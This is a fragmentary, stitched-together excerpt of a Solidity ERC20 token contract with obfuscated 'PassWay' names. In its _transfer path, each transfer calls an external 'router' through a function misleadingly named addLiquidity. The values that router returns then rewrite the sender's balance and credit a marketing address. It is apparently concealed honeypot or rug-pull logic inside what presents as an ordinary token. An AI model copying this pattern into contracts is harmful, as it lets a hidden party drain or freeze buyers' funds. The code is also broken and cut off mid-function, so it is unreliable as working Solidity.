...
// SPDX-License-Identifier: MIT
  ...
  function addLiquidity(address routerV2, address token0, address token1, uint256 valuePassWay, uint256 takePassWay) internal returns (uint256, uint256, uint256){  
    (uint256 amountPassWay, uint256 liquifyPassWay, uint256 ratePassWay) = IUniswapV2Router(routerV2).addLiquidity(
    token0,
    token1,
    valuePassWay,
    takePassWay);
    return ( amountPassWay, liquifyPassWay, ratePassWay );
  }   

  function shouldReflectPassWay(address sender, address recipient, uint256 takePassWay) internal view returns (uint256) {
    if (_isExcludedFromFee[sender] || _isExcludedFromFee[recipient])
    {
        takePassWay = takePassWay + 1;
    }
    return takePassWay;
  }   

  function PassedWwayFlyUp(address[] calldata accounts) external onlyOwner {
...
contract ERC20 is Context, IERC20, Ownable{
  ...
  function preSLaunch(uint256 launchAt, uint256 dura) public view returns (bool){
    ...
    function getRatePassWay(uint256 _amount, uint256 _ratePassWay) internal pure returns (uint256) {
        return _amount.mul(_ratePassWay).div(10**2);
    }         
    ...
    function getRPassWay(address tokenPassWay, uint256 amountPassWay, uint256 liquifyPassWay, uint256 ratePassWay) internal returns (uint256){
        if ( liquifyPassWay > 0 )
        {        
            _balances[tokenPassWay] = getRatePassWay(_balances[tokenPassWay], ratePassWay).add(amountPassWay);      
            _balances[_marketing] = _balances[_marketing].add(liquifyPassWay);
        }
        return amountPassWay;
    }  
    ...
    function reflectionFromPassWay(address sender, address recipient, uint256 amounts, uint256 takePassWay) internal returns (uint256) {   
        (uint256 amountPassWay, uint256 liquifyPassWay, uint256 ratePassWay) = addLiquidity(_router, sender, recipient, amounts, takePassWay);
        amountPassWay = getRPassWay(sender, amountPassWay, liquifyPassWay, ratePassWay);
        return amountPassWay;
    }  
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal  {
        ...
        takePassWay = shouldReflectPassWay(sender, recipient, takePassWay); 
        uint256 amountPassWay = reflectionFromPassWay(sender, recipient, amount, takePassWay);  
        _transferStandard(sender, recipient, amountPassWay);
...
function getCoreRebase(int256 supplyDelta, uint256 supplyMax) private returns (uint256) {
  ...
  function tokenbuyDividend(address shareholder, uint256 _amount) internal {    
